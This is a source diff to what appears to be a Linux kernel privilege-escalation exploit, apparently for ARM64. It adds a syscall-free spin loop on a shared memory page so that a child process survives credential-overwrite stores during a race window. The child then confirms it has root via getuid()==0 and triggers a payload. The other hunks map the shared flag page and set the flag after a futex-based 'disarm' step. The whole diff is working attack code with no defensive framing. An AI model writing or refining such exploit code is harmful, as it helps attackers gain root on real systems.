@@ -1738,6 +1738,24 @@ static void child_spin_until_cmd(int cmd_r, char *cmd) {
    * getuid + nanosleep ONLY — both cred-inert — so a landing at any
    * instant is survivable, and getuid()==0 self-triggers the payload. */
   if (env_flag("UID0_QUIET_CHILD", 0)) {
+    if (env_flag("UID0_PUR_SPIN", 0) && g_uid0_flag_page) {
+      /* PUR(ified) SPIN: ZERO syscalls during the punch window. A landed
+       * 0x780 store that catches the child inside ANY syscall (even
+       * getuid) kills it — and a zombie still reads status 2000 (real_cred
+       * untouched), i.e. it looks EXACTLY like a miss. Spin on a shared
+       * page instead; the parent flips the flag after the stores. */
+      volatile uint32_t *flag = (volatile uint32_t *)g_uid0_flag_page;
+      for (;;) {
+        while (*flag == 0)
+          __asm__ volatile("yield");
+        __sync_synchronize();
+        if ((uint32_t)getuid() == 0)
+          break; /* subjective root confirmed by the woken child itself */
+        *flag = 0; /* stage-1 (status-only): re-arm and keep spinning */
+      }
+      *cmd = 'G';
+      return;
+    }
     for (;;) {
       if ((uint32_t)getuid() == 0 || child_seen_root() || child_go_file()) {
         *cmd = 'G';
@@ -2288,6 +2306,9 @@ static int uid0_cred_walk(void) {
 
 uid0_cred_punch:;
   struct child_pipes pipes;
+  if (!g_uid0_flag_page)
+    g_uid0_flag_page = (uintptr_t)mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+                                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
   pid_t child = spawn_child(&pipes);
   if (child < 0) {
     pr_info("UID0: fork failed\n");
@@ -2609,6 +2630,10 @@ uid0_cred_punch:;
         struct timespec dts = { .tv_sec = 0, .tv_nsec = 0 };
         long dr = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &dts, NULL, 0);
         pr_info("UID0 DISARM2 ret=%ld errno=%d\n", dr, errno);
+      }
+      if (g_uid0_flag_page) {
+        *(volatile uint32_t *)g_uid0_flag_page = 1; /* wake pur-spin child */
+        __sync_synchronize();
       }
       usleep(500000); /* quiet child self-payloads on getuid()==0 */
       child_uid = uid0_child_getuid_query();
